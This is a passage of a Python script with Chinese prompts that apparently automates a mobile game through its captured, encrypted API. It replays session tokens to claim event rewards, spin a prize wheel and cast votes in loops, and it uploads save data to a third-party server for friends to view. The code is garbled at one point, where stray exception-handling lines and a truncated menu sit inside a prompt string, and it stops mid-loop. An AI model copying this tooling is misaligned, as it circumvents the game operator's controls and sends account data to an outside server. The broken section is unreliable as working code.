                    print(f"账号 {ui} 今日未使用，剩余 {remaining_days} 天，预计在 {end_date.strftime('%Y年%m月%d日')} 结束")
            elif remaining_days == 0:
                if s_flag:
                    print(f"账号 {ui} 今日已使用，剩余 0 天，授权将于今天结束")
                else:
                    print(f"账号 {ui} 今日未使用，剩余 0 天，授权已结束")
            else:
                print(f"账号 {ui} 剩余天数异常: {remaining_days}")

        elif response_json.get('status') == 'not_found':
            print(f"账号 {ui} 不存在")
        else:
            print(f"查询失败: {response_json.get('message', '未知错误')}")

    except requests.exceptions.RequestException as e:
        print(f"网络错误: {str(e)}")
    except json.JSONDecodeError:
        print("响应格式错误")
    except Exception as e:
        print(f"查询失败: {str(e)}")
    time.sleep(2)
def query_items(
    user_choice,
    il_list=None, pcl_list=None, dcl_list=None, ndcl_list=None,
    pl_list=None, dl_list=None, ndl_list=None, al_list=None, gene_list=None,
    formatted_plant=None, pinzhi_to_color=None, RESET_COLOR="\033[0m"
):
    QUERY_MAP = {
        "1": {
            "title": "=== 背包中道具 ===",
            "list": il_list,
            "id_key": "i",
            "qty_key": "q",
            "extra_info": lambda item, qty: f" x{qty}",
            "skip_zero": True
        },
        "2": {
            "title": "=== 背包中植物碎片 ===",
            "list": pcl_list,
            "id_key": "i",
            "qty_key": "q",
            "extra_info": lambda item, qty: f" x{qty}",
            "skip_zero": True
        },
        "3": {
            "title": "=== 背包中伴生装扮碎片 ===",
            "list": dcl_list,
            "id_key": "i",
            "qty_key": "q",
            "extra_info": lambda item, qty: f" x{qty}",
            "skip_zero": True
        },
        "4": {
            "title": "=== 背包装扮碎片 ===",
            "list": ndcl_list,
            "id_key": "i",
            "qty_key": "q",
            "extra_info": lambda item, qty: f" x{qty}",
            "skip_zero": True
        },
        "5": {
            "title": "=== 植物阶数 ===",
            "list": pl_list,
            "id_key": "i",
            "qty_key": "s",
            "extra_info": lambda item, _: f" {int(item.get('s', 0)) + 1}阶",
            "skip_zero": False
        },
        "6": {
            "title": "=== 已拥有的伴生装扮 ===",
            "list": dl_list,
            "id_key": None,
            "qty_key": None,
            "extra_info": lambda _, __: "",
            "is_numeric_id": True
        },
        "7": {
            "title": "=== 已拥有的装扮 ===",
            "list": ndl_list,
            "id_key": None,
            "qty_key": None,
            "extra_info": lambda _, __: "",
            "is_numeric_id": True
        },
        "8": {
            "title": "=== 神器列表 ===",
            "list": al_list,
            "id_key": "i",
            "qty_key": None,
            "extra_info": lambda item, _: f" 阶数:{int(item.get('s', 0))} 等级:{int(item.get('l', 0))}",
            "skip_zero": False
        },
        "9": {
            "title": "=== 基因等级列表 ===",
            "list": gene_list,
            "id_key": "gi",
            "qty_key": "l",
            "extra_info": lambda item, qty: f" 等级:{qty}",
            "skip_zero": False
        }
    }
    if user_choice not in QUERY_MAP:
        print("无效选项")
        return
    config = QUERY_MAP[user_choice]
    title = config["title"]
    items_list = config["list"]
    print(title)
    if not items_list:
        print("(无数据)")
        return
    display_items = []
    is_numeric_id = config.get("is_numeric_id", False)
    skip_zero = config.get("skip_zero", True)
    if is_numeric_id:
        for item_id in items_list:
            if not (isinstance(item_id, int) or (isinstance(item_id, str) and item_id.isdigit())):
                continue
            item_id_str = str(item_id)
            if formatted_plant and item_id_str in formatted_plant:
                info = formatted_plant[item_id_str]
                name = info.get("name", "未知装扮")
                pinzhi = info.get("pinzhi", "默认")
                color = pinzhi_to_color.get(pinzhi, "\033[0m")
                display_text = f"{color}{name}{RESET_COLOR}"
                display_items.append(display_text)
            else:
                display_items.append(f"{item_id_str} 未知装扮")
    else:
        for item in items_list:
            item_id = item.get(config["id_key"]) if config["id_key"] else None
            qty_key = config["qty_key"]
            qty = int(item.get(qty_key, 0)) if qty_key else 0

            if skip_zero and qty == 0:
                continue

            extra_text = config["extra_info"](item, qty)

            if item_id and formatted_plant:
                item_id = str(item_id)
                info = formatted_plant.get(item_id, {})
                name = info.get("name", "未知")
                pinzhi = info.get("pinzhi", "默认")
                color = pinzhi_to_color.get(pinzhi, "\033[0m")
                display_text = f"{color}{name}{RESET_COLOR}{extra_text}"
                display_items.append(display_text)
            else:
                display_text = f"[{item_id}]{extra_text}" if item_id else f"未知物品{extra_text}"
                display_items.append(display_text)
    print_in_columns(display_items, num_columns=2, column_spacing=6)
    print()
def post_request(endpoint, payload):
    url = f"{SERVER_URL}{endpoint}"
    try:
        r = requests.post(url, json=payload)
        response = r.json()
        if r.status_code != 200:
            return {"status": "error", "message": f"HTTP {r.status_code}: {response.get('message', '未知错误')}"}
        return response
    except Exception as e:
        return {"status": "error", "message": f"请求失败: {e}"}
def get_friend_choice(friends):
    if not friends:
        print("你还没有好友。")
        return None
    print("\n=== 选择要查看存档的好友 ===")
    for idx, friend_ui in enumerate(friends, start=1):
        print(f"{idx}. {friend_ui}")
    while True:
        try:
            sel = int(input("请选择要查看的好友序号 (输入数字，0取消): "))
            if sel == 0:
                return None
            if 1 <= sel <= len(friends):
                return friends[sel - 1]
            else:
                print("无效的序号，请重新输入。")
        except ValueError:
            print("请输入有效的数字。")
def run_nintieth_eighth_script():
    pi, ui, sk = get_pi_sk(加密)
    current_ui = ui
    if not current_ui:
        print("UI不能为空")
        exit()
    while True:
        print("\n===== 菜单 =====")
        print()
        print("1. 上传存档信息")
        print("2. 查看好友存档信息")
        print("3. 添加好友")
        print("4. 处理好友申请消息")
        print()
        print("空回车退出")
        choice = input("请选择操作 (0-4): ").strip()
        if choice == '1':
            data = {"req": "V303", "e": {"al": [{"id": 10859, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            try:
                decrypted_json = json.loads(decrypted_response)
            except json.JSONDecodeError:
                decrypted_json = {"error": "无法解析解密响应"}
            shuangren = decrypted_json
            if not shuangren:
                print("存档内容不能为空")
                continue
            data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            v316 = decrypted_json
            res = post_request("/upload", {"ui": current_ui, "V316": v316, "shuangren": shuangren})
            print(res.get("message", "未知响应"))
        elif choice == '2':
            res = post_request("/get_friends_list", {"ui": current_ui})
            if res.get("status") != "success":
                print(f"获取好友列表失败: {res.get('message')}")
                continue
            friends_ui = res.get("friends", [])
            selected_friend_ui = get_friend_choice(friends_ui)
            if not selected_friend_ui:
                print("已取消查看存档。")
                continue
            res = post_request("/get_friends_info", {"ui": current_ui, "friend_ui": selected_friend_ui})
            if res.get("status") == "success":
                print(f"\n好友 {selected_friend_ui} 的存档信息如下:")
                v316 = res.get('V316')
                shuangren = res.get('shuangren')
                if v316:
                    try:
                        fg_values = v316.get('e', {}).get('d', {}).get('p', {}).get('fg', '')
                        uk_values = v316.get('e', {}).get('d', {}).get('p', {}).get('uk', '')
                        il_list = v316.get('e', {}).get('d', {}).get('il', [])
                        pcl_list = v316.get('e', {}).get('d', {}).get('pcl', [])
                        dcl_list = v316.get('e', {}).get('d', {}).get('dcl', [])
                        ndcl_list = v316.get('e', {}).get('d', {}).get('ndcl', [])
                        pl_list = v316.get('e', {}).get('d', {}).get('pl', [])
                        for item in pl_list:
                            i_value = item['i']
                            s_value = item['s']
                            found = False
                            jieshu_value = None
                            for plant_dict in plant_list:
                                plant_id = next(iter(plant_dict))
                                if int(plant_id) == int(i_value):
                                    found = True
                                    jieshu_value = plant_dict.get('jieshu')
                                    break
                            if found:
                                s_int = int(s_value)
                                jieshu_int = int(jieshu_value)
                                if s_int > jieshu_int:
                                    item['s'] = jieshu_value
                                else:
                                    pass
                            else:
                                print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
                        dl_list = v316.get('e', {}).get('d', {}).get('dl', [])
                        ndl_list = v316.get('e', {}).get('d', {}).get('ndl', [])
                        al_list = v316.get('e', {}).get('d', {}).get('al', [])
                        gene_list = v316.get('e', {}).get('d', {}).get('gene', [])
                        print(f""" \033[96m钻石\033[0m {fg_values}    UK值{uk_values}""")
                        user_input = input(f"""

                    except Exception:
                        pass
 5. 植物阶数
 8. 神器列表

 请输入选项: """).strip()
                        if not user_input:
                            print("退出查询。")
                            break
                        elif user_input == "10":
                            zb_lt = json.loads(shuangren["e"]["d"][0]["data"])
                            zbl_list = zb_lt.get('zombiesData')
                            list_data = zbl_list['list']
                            chip_data = zbl_list['chip']
                            list_lv_map = {item['i'] + 4000: item['lv'] for item in list_data}
                            for chip in chip_data:
                                chip_id = chip['i']
                                if chip_id in list_lv_map:
                                    level = list_lv_map[chip_id]
                                    i_value = str(chip.get('i', ""))
                                    q_value = chip.get('q', 0)
                                    plant_info = formatted_plant.get(
                                        i_value,
                                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                    )
                                    plant_name = plant_info["name"]
                                    plant_pinzhi = plant_info["pinzhi"]
                                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                    print(f"\n {color_code}{plant_name}{RESET_COLOR} lv:{level} x{q_value}\n")
                        elif user_input == "11":
                            data_str = shuangren['e']['d'][0]['data']
                            data_dict = json.loads(data_str)
                            grade = data_dict['pf']['grade']
                            big = grade['big']
                            small = grade['small']
                            star = grade['star']
                            big_rank_mapping = {0: "铜锅", 1: "银锅", 2: "金锅", 3: "钻锅", 4: "大师锅", 5: "宗师锅"}
                            big_rank = big_rank_mapping[big]
                            small_rank_mapping = {0: "V", 1: "IV", 2: "III", 3: "II",4:"I"}
                            small_rank = small_rank_mapping[small]
                            star_count = star
                            print(f" 当前段位：{big_rank}{small_rank}  {star_count}星")
                            data_str = shuangren['e']['d'][0]['data']
                            parsed_data = json.loads(data_str)
                            pf_data = parsed_data['pf']
                            print(" 与玩家对战数:", pf_data["fight_count"])
                            time.sleep(0)
                            print(" 总胜场:", pf_data["win_count"])
                            time.sleep(0)
                            print(" 满血胜利数:", pf_data["full_hp_win_count"])
                            time.sleep(0)
                            print(" 总败场:", pf_data["lost_count"])
                            time.sleep(0)
                            print(" 最高连胜数:", pf_data["con_win_max"])
                            time.sleep(0)
                            print(" 目前连胜数:", pf_data["con_win_count"])
                            time.sleep(0)
                            print(" 最高评分:", pf_data["rating_max"])
                            time.sleep(0)
                            print(" 种植植物总数:", pf_data["plat_plants"])
                            time.sleep(0)
                            print(" 击杀僵尸总数:", pf_data["kill_zombies"])
                            time.sleep(0)
                            print(" 释放僵尸总数:", pf_data["release_zombies"])
                            time.sleep(0)
                            fight_count = pf_data["fight_count"]
                            if fight_count == 0:
                                fight_count = 1
                            win_rate = (fight_count - pf_data["lost_count"]) / fight_count * 100
                            win_rate = "{:.2f}%".format(win_rate)
                            print(f" 对人胜率: {win_rate}")
                        query_items(
                            user_input,
                            il_list=il_list, pcl_list=pcl_list, dcl_list=dcl_list, ndcl_list=ndcl_list,
                            pl_list=pl_list, dl_list=dl_list, ndl_list=ndl_list, al_list=al_list, gene_list=gene_list,
                            formatted_plant=formatted_plant, pinzhi_to_color=pinzhi_to_color, RESET_COLOR=RESET_COLOR
                        )
                    except Exception as e:
                        print(f"处理 V316 数据时出错: {e}")
                        print("V316 原始数据:", v316)
                else:
                    print("未找到 V316 数据")
            else:
                print(f"错误: {res.get('message', '未知错误')}")
        elif choice == '3':
            friend_ui = input("请输入要添加的好友UI: ").strip()
            if not friend_ui:
                print("好友UI不能为空")
                continue
            res = post_request("/add_friend", {"ui": current_ui, "friend_ui": friend_ui})
            print(res.get("message", "未知响应"))
        elif choice == '4':
            res = post_request("/get_friend_requests", {"ui": current_ui})
            if res.get("status") != "success":
                print(f"获取申请列表失败: {res.get('message')}")
                continue
            requests_list = res.get("requests", [])
            if not requests_list:
                print("暂无好友申请")
                continue
            print("=== 好友申请列表 ===")
            for idx, req_ui in enumerate(requests_list, start=1):
                print(f"{idx}. {req_ui}")
            while True:
                try:
                    sel = int(input("请选择要同意的好友序号 (输入数字，0取消): "))
                    if sel == 0:
                        print("已取消接受好友申请。")
                        break
                    if 1 <= sel <= len(requests_list):
                        selected_ui = requests_list[sel - 1]
                        accept_res = post_request("/accept_friend", {"ui": current_ui, "friend_ui": selected_ui})
                        print(accept_res.get("message", "未知响应"))
                        break
                    else:
                        print("无效的序号，请重新输入。")
                except ValueError:
                    print("请输入有效的数字。")
        elif choice == '':
            print("再见！")
            break
        else:
            print("无效选择，请重新输入")
def run_nintieth_ninth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10894, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        for i in range(2):
            data = {"req": "V1081", "e": {"pi": pi, "sk": sk, "t": i, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("奖励领取成功")
            else:
                print("奖励领取失败")
        data = {"req": "V1080", "e": {"pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("奖励领取成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            gifts = decrypted_json['e']['d'].get('bl', [])
            for gift in gifts:
                i_value = str(gift.get('i', ""))
                q_value = gift.get('q', 0)
                plant_info = formatted_plant.get(
                    i_value,
                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}")
                print(f"获得的数量为: {q_value}")
        else:
            print("奖励领取失败")
def lingyingzhuanpan():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10851, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        rrbl_list = data_dict.get('rrbl', [])
        result = []
        for idx, item in enumerate(rrbl_list):
            if item.get('isGet') == 1 and 'boxList' in item:
                result.append(idx)
                box_list = item['boxList']
                print("可选择的奖励为: \n")
                for i, reward in enumerate(box_list, 1):
                    i_value = str(reward.get('i'))
                    q_value = reward.get('q')
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"{i}. {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                try:
                    choice = int(input("\n请输入你要选择的奖励序号："))
                    if 1 <= choice <= 5:
                        xuanze_value = choice - 1
                        data = {"req": "V430", "e": {"bai": xuanze_value, "gi": idx, "pi": pi, "sk": sk, "type": "1", "ui": ui}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("奖励领取成功")
                        else:
                            print("奖励领取失败")
                    else:
                        print("输入序号超出范围，请输入有效数字。")
                except ValueError:
                    print("请输入有效的数字")
        while True:
            data = {"req":"V430","e":{"ln":"0","pi":pi,"sk":sk,"type":"0","ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                d = decrypted_json['e']['d']
                award_index = d.get('awardIndex')
                reward_list = d.get('reward_list')
                if reward_list:
                    reward_item = reward_list[0]
                    i_value = str(reward_item.get('i'))
                    q_value = reward_item.get('q')
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                else:
                    print(f"抽中自选")
                    boxlist_indexes = []
                    for idx, item in enumerate(rrbl_list):
                        if 'boxList' in item:
                            boxlist_indexes.append(idx)
                    if award_index is not None:
                        if award_index in boxlist_indexes:
                            target_dict = rrbl_list[award_index]
                            if 'boxList' in target_dict:
                                box_items = target_dict['boxList']
                                print("\n可选择的奖励如下：")
                                for i, box_item in enumerate(box_items, 1):
                                    i_value = str(box_item.get('i'))
                                    q_value = box_item.get('q')
                                    plant_info = formatted_plant.get(
                                        i_value,
                                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                    )
                                    plant_name = plant_info["name"]
                                    plant_pinzhi = plant_info["pinzhi"]
                                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                    print(f"{i}: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                try:
                                    choice = int(input("\n请输入你要选择的奖励序号："))
                                    if 1 <= choice <= len(box_items):
                                        xuanze_value = choice - 1
                                        data = {"req": "V430", "e": {"bai": xuanze_value, "gi": award_index, "pi": pi, "sk": sk, "type": "1", "ui": ui}, "ev": 3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            print("奖励领取成功")
                                        else:
                                            print("奖励领取失败")
                                    else:
                                        print("输入序号超出范围，请输入有效数字。")
                                except ValueError:
                                    print("请输入有效的数字")
                            else:
                                print("该字典中有 awardIndex 匹配，但未找到 boxList。")
                        else:
                            print(f"awardIndex {award_index} 未匹配到 rrbl 中含有 boxList 的字典。当前匹配到的 boxList 索引有：{boxlist_indexes}")
                    else:
                        print("decrypted_json 中没有 awardIndex，跳过 rrbl 匹配。")
            else:
                print("转盘已抽取完全")
                break
def xinyuantuangou():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10814, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dick = json.loads(decrypted_json["e"]["d"][0].get("data"))
        vb_list = data_dick.get('vb', [])
        lvt_values = data_dick['lvt']
        vt_values = data_dick['vt']
        print(f"\n当前票数\033[38;5;46m{lvt_values}\033[0m，已投出\033[38;5;46m{vt_values}\033[0m票\n")
        for gift in vb_list:
            i_value = str(gift.get('i', ""))
            q_value = gift.get('q', 0)
            vt_value = gift.get('vt', 0)
            plant_info = formatted_plant.get(
                i_value,
                {"name": f"未知物品({i_value})", "pinzhi": "default"}
            )
            plant_name = plant_info["name"]
            plant_pinzhi = plant_info["pinzhi"]
            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
            print(f"奖励: {color_code}{plant_name}{RESET_COLOR}×{q_value}，条件: 投出{vt_value}票")
        print()
        sorted_vp = sorted(data_dick['vp'], key=lambda x: int(x['q']),reverse=True)
        for idx, dict in enumerate(sorted_vp, 1):
            i_value = str(dict.get('i', ""))
            q_value = dict.get('q', 0)
            plant_info = formatted_plant.get(
                i_value,
                {"name": f"未知物品({i_value})", "pinzhi": "default"}
            )
            plant_name = plant_info["name"]
            plant_pinzhi = plant_info["pinzhi"]
            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
            print(f"{idx}. {color_code}{plant_name}{RESET_COLOR} 得票: {q_value}")
        while True:
            try:
                choice = input("\n请输入要投票的植物: ")
                if choice == "":
                    return
                else:
                    choice = int(choice)
                ps_value = input("\n请输入要投的票数: ")
                if ps_value == "":
                    return
                else:
                    ps_value = int(ps_value)
                if 1 <= choice <= len(sorted_vp):
                    result = sorted_vp[choice-1]['i']
                elif ps_value == "":
                    break
                else:
                    print(f"错误: 请输入范围内数字")
                for i in range(ps_value):
                    data = {"req":"V936","e":{"pi":pi,"pid":str(result),"sk":sk,"ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("投票成功")
                    elif response_data.get("r") == 45031:
                        print("票数不足")
                        break
                    else:
                        print("投票失败")
                        break
            except ValueError:
                print("错误: 请输入有效的数字")
                break
    data = {"req": "V303", "e": {"al": [{"id": 10814, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dick = json.loads(decrypted_json["e"]["d"][0].get("data"))
        vt_values = data_dick['vt']
        qualified_indices = []
        for idx, item in enumerate(data_dick['vb']):
            if item.get('vt', float('inf')) <= vt_values and item.get('s', 1) == 0:
                qualified_indices.append(idx)
        for i in qualified_indices:
            data = {"req":"V792","e":{"ai":"10814","i":i,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("奖励领取成功")
            else:
                print("奖励领取失败")
                break
def jiazujiance():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    fl_list = decrypted_json['e']['d'].get('fl', [])
    zw_list = decrypted_json['e']['d'].get('pl', [])
    for item in zw_list:
        i_value = item['i']
        s_value = item['s']
        found = False
        jieshu_value = None
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                found = True
                jieshu_value = plant_dict.get('jieshu')
                break
        if found:
            s_int = int(s_value)
            jieshu_int = int(jieshu_value)
            if s_int > jieshu_int:
                item['s'] = jieshu_value
            else:
                pass
        else:
            print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
    dl_list = decrypted_json['e']['d'].get('dl', [])
    ndl_list = decrypted_json['e']['d'].get('ndl', [])
    zb_list = dl_list + ndl_list
    dj_list = [{'i': '50001', 'lev': 0, 'z': [1001,1002,1003,1004,1005]},
    {'i': '50002', 'lev': 0, 'z': [111038,111002,1052,1008,1002]},
    {'i': '50003', 'lev': 0, 'z': [111003,111036,1044,1029,1081]},
    {'i': '50004', 'lev': 0, 'z': [111012,111015,1098,111025,1070]},
    {'i': '50005', 'lev': 0, 'z': [1062,111043,111020,111016,1009]},
    {'i': '50006', 'lev': 0, 'z': [111021,1078,1012,111018,1059]},
    {'i': '50007', 'lev': 0, 'z': [1006,1019,1031,1058,111033]},
    {'i': '50008', 'lev': 0, 'z': [111029,111030,1099,1090,1022]},
    {'i': '50009', 'lev': 0, 'z': [1043,1037,1039,1040,111019]},
    {'i': '50010', 'lev': 0, 'z': [111035,111022,1030,1027,1025]},
    {'i': '50011', 'lev': 0, 'z': [111001,1047,1023,1067,111044]},
    {'i': '50012', 'lev': 0, 'z': [111042,111008,1021,1024,1080]},
    {'i': '50013', 'lev': 0, 'z': [111009,1060,1054,1071,111017]},
    {'i': '50014', 'lev': 0, 'z': [1085,1007,1036,1034,1039]},
    {'i': '50015', 'lev': 0, 'z': [1086,1065,1093,111032,1025]},
    {'i': '50016', 'lev': 0, 'z': [111026,1097,1051,1050,1049]},
    {'i': '50017', 'lev': 0, 'z': [111058,111055,111054,111052,111051]},
    {'i': '50018', 'lev': 0, 'z': [111064,111066,111067,111069,111070]},
    {'i': '50019', 'lev': 0, 'z': [200003,200002,111091,111090,111089]},
    {'i': '50020', 'lev': 0, 'z': [111075,111049,200018,200017,200013]},
    {'i': '50021', 'lev': 0, 'z': [1015,200016,200019,200001,111085]},
    {'i': '50022', 'lev': 0, 'z': [200048,200051,111087,200024,200034]},
    {'i': '50023', 'lev': 0, 'z': [200025,200041,200033,200029,111053]},
    {'i': '50024', 'lev': 0, 'z': [111045,200047,200026,200053,200049]},
    {'i': '50025', 'lev': 0, 'z': [111062,111034,200037,200046,200052]},
    {'i': '50026', 'lev': 0, 'z': [111082,200044,200028,1095,1088]},
    {'i': '50027', 'lev': 0, 'z': [200102,200079,200056,200038]},
    {'i': '50028', 'lev': 0, 'z': [200022,111046,200031,200039,200055]},
    {'i': '50029', 'lev': 0, 'z': [200057,111079,111050,200009,111023]},
    {'i': '50030', 'lev': 0, 'z': [200000,200008,111048,111071,111088]},
    {'i': '50031', 'lev': 0, 'z': [111061,1068,111063,200032,111040]},
    {'i': '50032', 'lev': 0, 'z': [200027,1061,111039,200023,200005]},
    {'i': '50033', 'lev': 0, 'z': [200020,200021,1010,1011,1028]},
    {'i': '50034', 'lev': 0, 'z': [1072,200059,200060,111004,200054]},
    {'i': '50035', 'lev': 0, 'z': [200035,200061,200058,200007,1014]},
    {'i': '50036', 'lev': 0, 'z': [111074,111076,111031,200011,200069]},
    {'i': '50037', 'lev': 0, 'z': [200010,200006,200064,111010,1082]},
    {'i': '50038', 'lev': 0, 'z': [1071,200072,111027,111073,1073]},
    {'i': '50039', 'lev': 0, 'z': [200073,1033,1035,200015,200010]},
    {'i': '50040', 'lev': 0, 'z': [111011,111081,200065,1017,1032]},
    {'i': '50041', 'lev': 0, 'z': [200075,200076,111084,200077,200014]},
    {'i': '50042', 'lev': 0, 'z': [1092,1076,200050,200045,200066]},
    {'i': '50043', 'lev': 0, 'z': [111072,111086,111013,111060,1020]},
    {'i': '50044', 'lev': 0, 'z': [1042,200012,200051,200062,200063]},
    {'i': '50045', 'lev': 0, 'z': [111078,200071,1084,200043,111068]},
    {'i': '50046', 'lev': 0, 'z': [1069,200048,200082,1063,111022]},
    {'i': '50047', 'lev': 0, 'z': [111028,111001,1047,1045,1035]},
    {'i': '50048', 'lev': 0, 'z': [200100,200101,200093,200092]},
    {'i': '50049', 'lev': 0, 'z': [200091,200083,200099]},
    {'i': '50050', 'lev': 0, 'z': [200128,200067,200068]},
    {'i': '50051', 'lev': 0, 'z': [200140,200139,200138,200136,200135]}]
    processed_zb = []
    for num in zb_list:
        if num < 200000:
            processed_num = num - 200
        else:
            processed_num = (num // 10) - 3000000
        processed_zb.append(processed_num)
    for x in processed_zb:
        for d in dj_list:
            if x in d['z']:
                d['lev'] += 1
    zw_map = {int(item['i']): int(item['s'])+1 for item in zw_list}
    for d in dj_list:
        z_numbers = d['z']
        for num in z_numbers:
